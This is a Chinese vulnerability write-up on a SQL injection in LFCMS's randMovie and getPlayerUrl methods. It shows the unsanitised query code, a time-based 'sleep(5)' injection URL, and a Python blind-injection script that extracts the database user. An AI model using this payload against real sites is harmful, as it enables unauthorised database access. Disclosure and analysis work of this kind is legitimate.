LFCMS AjaxController.class.php 前台sql注入漏洞
==============================================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

漏洞起始点位于`/Application/Home/Controller/AjaxController.class.php`文件中的`randMovie`方法，代码如下

![1.png](/Users/aresx/Documents/VulWiki/.resource/LFCMSAjaxController.class.php前台sql注入漏洞/media/rId24.png)

第七行代码中调用了`Ajax`模型中的`randMovie`方法，同时`limit`和`category`是我们输入的可控的参数，跟进`randMovie`方法

    public function randMovie($limit=6,$category='') {
        if($category) {
            $type='and category='.$category;
        }
        $prefix=C('DB_PREFIX');
        $mlist=M()->query('SELECT * FROM `'.$prefix.'movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `'.$prefix.'movie`)-(SELECT MIN(id) FROM `'.$prefix.'movie`))+(SELECT MIN(id) FROM `'.$prefix.'movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx '.$type.' ORDER BY t1.id LIMIT '.$limit);
        foreach($mlist as $key=>$value) {
            $list[$key]=D('Tag')->movieChange($value,'movie');
        }
        return $list;
    }

在这里注意到`$type`与`$limit`在`sql`语句执行时均没有被单引号包裹，直接拼接到语句当中，这里就存在了sql注入的可能，首先我们在`movie`表里放一条数据，看一下正常执行时sql语句是如何执行的

![2.png](/Users/aresx/Documents/VulWiki/.resource/LFCMSAjaxController.class.php前台sql注入漏洞/media/rId25.png)

查看数据库日志可以得到如下`sql`语句

    SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 ORDER BY t1.id LIMIT 1

接着来尝试下进行注入，测试链接如下

    http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&category=2 and sleep(5)

页面确实延迟了5秒，那么接着看一下后端数据库的语句

    SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1

基本可以判断该处存在着可用的注入点，接下来编写脚本跑一下数据库用户名试试

    import requests
    url = 'http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&category=2 and '
    s = requests.session()
    result = ""
    for i in range(1,50):
        print('==========================')
        for j in range(32,127):
            payload = "if((ascii(substr((select user()),{},1))={}),sleep(5),0)".format(i,j)
            temp = url+payload
            try:
                s.get(temp,timeout=5)
            except:
                result+= chr(j)
                print(result)
                break

![3.png](/Users/aresx/Documents/VulWiki/.resource/LFCMSAjaxController.class.php前台sql注入漏洞/media/rId26.png)

相同原理的利用点同样不止一个，如`/Application/Home/Controller/PlayerController.class.php`文件中的`down`方法调用了模型`movie`中的`getPlayerUrl`方法，该方法的`pid`参数同样可以注入

参考链接
--------

> https://xz.aliyun.com/t/7844
